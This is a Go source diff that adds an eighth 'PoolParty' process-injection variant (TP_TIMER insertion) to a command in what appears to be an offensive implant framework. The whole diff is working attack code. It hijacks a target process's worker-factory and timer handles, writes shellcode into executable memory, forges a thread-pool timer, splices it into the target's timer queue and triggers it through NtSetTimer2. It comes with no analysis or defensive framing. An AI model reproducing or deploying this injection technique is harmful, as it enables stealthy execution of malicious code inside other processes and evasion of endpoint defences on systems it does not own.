@@ -197,10 +197,73 @@ type TPP_QUEUE struct {
 
 // FULL_TP_POOL structure (simplified - only fields we need)
 type FULL_TP_POOL struct {
-	_         [16]byte     // Refcount and padding
-	_         [8]byte      // QueueState
-	TaskQueue [3]uintptr   // Array of pointers to TPP_QUEUE
-	_         [1024]byte   // Rest of the structure (we don't need these fields)
+	_          [16]byte     // Refcount and padding
+	_          [8]byte      // QueueState
+	TaskQueue  [3]uintptr   // Array of pointers to TPP_QUEUE
+	_          [8]byte      // NumaNode pointer
+	_          [8]byte      // ProximityInfo pointer
+	_          [8]byte      // WorkerFactory pointer
+	_          [8]byte      // CompletionPort pointer
+	_          [40]byte     // Lock (RTL_SRWLOCK)
+	_          [16]byte     // PoolObjectList
+	_          [16]byte     // WorkerList
+	TimerQueue TPP_TIMER_QUEUE
+	// Rest omitted - we only need TimerQueue
+}
+
+// TPP_PH structure
+type TPP_PH struct {
+	Root uintptr
+}
+
+// TPP_PH_LINKS structure
+type TPP_PH_LINKS struct {
+	Siblings LIST_ENTRY
+	Children LIST_ENTRY
+	Key      int64
+}
+
+// TPP_TIMER_SUBQUEUE structure
+type TPP_TIMER_SUBQUEUE struct {
+	Expiration       int64
+	WindowStart      TPP_PH
+	WindowEnd        TPP_PH
+	Timer            uintptr
+	TimerPkt         uintptr
+	Direct           TP_DIRECT
+	ExpirationWindow uint32
+	_                [4]byte // padding
+}
+
+// TPP_TIMER_QUEUE structure
+type TPP_TIMER_QUEUE struct {
+	_                [40]byte // Lock (RTL_SRWLOCK)
+	AbsoluteQueue    TPP_TIMER_SUBQUEUE
+	RelativeQueue    TPP_TIMER_SUBQUEUE
+	AllocatedTimerCount int32
+	_                [4]byte // padding
+}
+
+// FULL_TP_TIMER structure
+type FULL_TP_TIMER struct {
+	Work             FULL_TP_WORK
+	_                [40]byte // Lock (RTL_SRWLOCK)
+	WindowEndLinks   TPP_PH_LINKS
+	WindowStartLinks TPP_PH_LINKS
+	DueTime          int64
+	_                [64]byte // Ite structure
+	Window           uint32
+	Period           uint32
+	Inserted         uint8
+	WaitTimer        uint8
+	TimerStatus      uint8
+	BlockInsert      uint8
+	_                [4]byte // padding
+}
+
+// T2_SET_PARAMETERS structure for NtSetTimer2
+type T2_SET_PARAMETERS struct {
+	_      [96]byte // Full structure is complex, we only need to pass zeros
 }
 
 // NT API procedures
@@ -212,9 +275,12 @@ var (
 	procNtQueryObject                     = ntdll.NewProc("NtQueryObject")
 	procZwSetIoCompletion                 = ntdll.NewProc("ZwSetIoCompletion")
 	procRtlNtStatusToDosError             = ntdll.NewProc("RtlNtStatusToDosError")
+	procNtSetTimer2                       = ntdll.NewProc("NtSetTimer2")
 	procReadProcessMemory                 = kernel32.NewProc("ReadProcessMemory")
 	procCreateThreadpoolWork              = kernel32.NewProc("CreateThreadpoolWork")
 	procCloseThreadpoolWork               = kernel32.NewProc("CloseThreadpoolWork")
+	procCreateThreadpoolTimer             = kernel32.NewProc("CreateThreadpoolTimer")
+	procCloseThreadpoolTimer              = kernel32.NewProc("CloseThreadpoolTimer")
 )
 
 // PoolPartyInjectionCommand implements the poolparty-injection command
@@ -298,6 +364,8 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 		output, err = executeVariant2(shellcode, uint32(params.PID))
 	case 7:
 		output, err = executeVariant7(shellcode, uint32(params.PID))
+	case 8:
+		output, err = executeVariant8(shellcode, uint32(params.PID))
 	default:
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Error: Unsupported variant %d", params.Variant),
@@ -767,6 +835,223 @@ func executeVariant7(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += "[+] Queued packet to I/O completion port\n"
 	output += "[+] PoolParty Variant 7 injection completed successfully\n"
+
+	return output, nil
+}
+
+// executeVariant8 implements TP_TIMER Insertion - Variant 8
+func executeVariant8(shellcode []byte, pid uint32) (string, error) {
+	var output string
+	output = fmt.Sprintf("[*] PoolParty Variant 8: TP_TIMER Insertion\n")
+	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
+	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
+
+	// Step 1: Open target process
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
+			windows.PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
+		false,
+		pid,
+	)
+	if err != nil {
+		return output, fmt.Errorf("OpenProcess failed: %v", err)
+	}
+	defer windows.CloseHandle(hProcess)
+	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
+
+	// Step 2: Hijack worker factory handle
+	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
+	if err != nil {
+		return output, fmt.Errorf("Failed to hijack worker factory handle: %v", err)
+	}
+	defer windows.CloseHandle(hWorkerFactory)
+	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)
+
+	// Step 3: Hijack IR timer handle
+	hTimer, err := hijackProcessHandle(hProcess, "IRTimer", windows.TIMER_ALL_ACCESS)
+	if err != nil {
+		return output, fmt.Errorf("Failed to hijack timer handle: %v", err)
+	}
+	defer windows.CloseHandle(hTimer)
+	output += fmt.Sprintf("[+] Hijacked timer queue handle: 0x%X\n", hTimer)
+
+	// Step 4: Query worker factory to get TP_POOL address
+	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
+	var returnLength uint32
+	status, _, _ := procNtQueryInformationWorkerFactory.Call(
+		uintptr(hWorkerFactory),
+		uintptr(WorkerFactoryBasicInformation),
+		uintptr(unsafe.Pointer(&workerFactoryInfo)),
+		uintptr(unsafe.Sizeof(workerFactoryInfo)),
+		uintptr(unsafe.Pointer(&returnLength)),
+	)
+	if status != 0 {
+		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
+	}
+	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)
+
+	// Step 5: Allocate and write shellcode to target process
+	shellcodeAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(len(shellcode)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
+	)
+	if shellcodeAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)
+
+	var bytesWritten uintptr
+	ret, _, err := procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		shellcodeAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
+
+	// Step 6: Create TP_TIMER structure via CreateThreadpoolTimer
+	pTpTimer, _, err := procCreateThreadpoolTimer.Call(
+		shellcodeAddr, // Timer callback points to shellcode
+		0,             // Context
+		0,             // Callback environment
+	)
+	if pTpTimer == 0 {
+		return output, fmt.Errorf("CreateThreadpoolTimer failed: %v", err)
+	}
+	output += "[+] Created TP_TIMER structure associated with shellcode\n"
+
+	// Step 7: Allocate memory for TP_TIMER in target process first (we need the address)
+	var tpTimer FULL_TP_TIMER
+	tpTimerAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(unsafe.Sizeof(tpTimer)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_READWRITE),
+	)
+	if tpTimerAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for TP_TIMER failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated TP_TIMER memory at: 0x%X\n", tpTimerAddr)
+
+	// Step 8: Copy the local TP_TIMER structure
+	for i := 0; i < int(unsafe.Sizeof(tpTimer)); i++ {
+		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpTimer)) + uintptr(i))) =
+			*(*byte)(unsafe.Pointer(pTpTimer + uintptr(i)))
+	}
+
+	// Close the local TP_TIMER now that we've copied it
+	procCloseThreadpoolTimer.Call(pTpTimer)
+
+	// Step 9: Modify TP_TIMER structure for insertion
+	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)
+
+	// Set Pool pointer to target's TP_POOL
+	tpTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
+
+	// Set timer expiration
+	tpTimer.DueTime = timeout
+	tpTimer.WindowStartLinks.Key = timeout
+	tpTimer.WindowEndLinks.Key = timeout
+
+	// Set up circular lists for WindowStart and WindowEnd Children
+	// Calculate remote addresses for the Window*Links.Children fields
+	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks.Children))
+	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks.Children))
+
+	tpTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
+	tpTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
+	tpTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
+	tpTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr
+
+	output += "[+] Modified TP_TIMER structure for insertion\n"
+
+	// Step 10: Write TP_TIMER to target process
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		tpTimerAddr,
+		uintptr(unsafe.Pointer(&tpTimer)),
+		uintptr(unsafe.Sizeof(tpTimer)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for TP_TIMER failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)
+
+	// Step 11: Read target TP_POOL's TimerQueue to get addresses for WindowStart and WindowEnd roots
+	targetTpPoolAddr := workerFactoryInfo.StartParameter
+	var targetTpPool FULL_TP_POOL
+	var bytesRead uintptr
+	ret, _, err = procReadProcessMemory.Call(
+		uintptr(hProcess),
+		targetTpPoolAddr,
+		uintptr(unsafe.Pointer(&targetTpPool)),
+		uintptr(unsafe.Sizeof(targetTpPool)),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
+	}
+	output += "[+] Read target process's TP_POOL structure\n"
+
+	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
+	// Calculate addresses for WindowStart.Root and WindowEnd.Root in target TP_POOL
+	windowStartRootAddr := targetTpPoolAddr + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue)) + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue.AbsoluteQueue)) + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue.AbsoluteQueue.WindowStart))
+	windowEndRootAddr := targetTpPoolAddr + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue)) + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue.AbsoluteQueue)) + uintptr(unsafe.Offsetof(targetTpPool.TimerQueue.AbsoluteQueue.WindowEnd))
+
+	// Calculate address of our timer's WindowStartLinks
+	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks))
+	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks))
+
+	// Write WindowStartLinks address to WindowStart.Root
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		windowStartRootAddr,
+		uintptr(unsafe.Pointer(&remoteWindowStartLinksAddr)),
+		uintptr(unsafe.Sizeof(remoteWindowStartLinksAddr)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for WindowStart.Root failed: %v", err)
+	}
+
+	// Write WindowEndLinks address to WindowEnd.Root
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		windowEndRootAddr,
+		uintptr(unsafe.Pointer(&remoteWindowEndLinksAddr)),
+		uintptr(unsafe.Sizeof(remoteWindowEndLinksAddr)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for WindowEnd.Root failed: %v", err)
+	}
+	output += "[+] Modified target process's TP_POOL timer queue to point to TP_TIMER\n"
+
+	// Step 13: Set the timer to expire via NtSetTimer2
+	var dueTime int64
+	dueTime = timeout
+
+	var params T2_SET_PARAMETERS
+	status, _, _ = procNtSetTimer2.Call(
+		uintptr(hTimer),
+		uintptr(unsafe.Pointer(&dueTime)),
+		0, // Period
+		uintptr(unsafe.Pointer(&params)),
+	)
+	if status != 0 {
+		return output, fmt.Errorf("NtSetTimer2 failed: 0x%X", status)
+	}
+	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
+	output += "[+] PoolParty Variant 8 injection completed successfully\n"
 
 	return output, nil
 }
